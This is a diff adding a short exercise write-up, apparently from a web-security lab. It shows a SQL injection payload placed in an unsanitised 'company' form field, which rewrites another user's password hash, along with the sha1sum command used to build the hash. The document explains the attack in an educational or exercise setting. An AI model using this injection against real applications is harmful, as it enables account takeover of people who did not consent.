@@ -1,0 +1,15 @@
+"areallylongpasswordfornoparticularreason"
+ted
+"name"="bob"
+"company"="', pass="e0fb3470c8cbe1b695454906f88d3077525b76e3" WHERE name="bob";-- "
+"email"="hacked@hacked.com"
+
+i noticed that the company form field is not being sanitized by `mysql_real_escape_string` (commented out) in the src code. this means we have a sqli attack vector on the company field.
+
+first, i computed the sha1 sum for bob's new password by running:
+> echo -n "areallylongpasswordfornoparticularreason" | sha1sum
+
+then, i altered the sql statement to change the `pass` value to the new sha1 hash, and wrote a WHERE clause to modify bob's user instead of ted. this was all injected into the vulnerable company form field.
+
+note that the email form field is likely not necessary, but was marked as required in the browser form. i was too lazy to process the form outside of the browser so i left it in ¯\_(ツ)_/¯
+
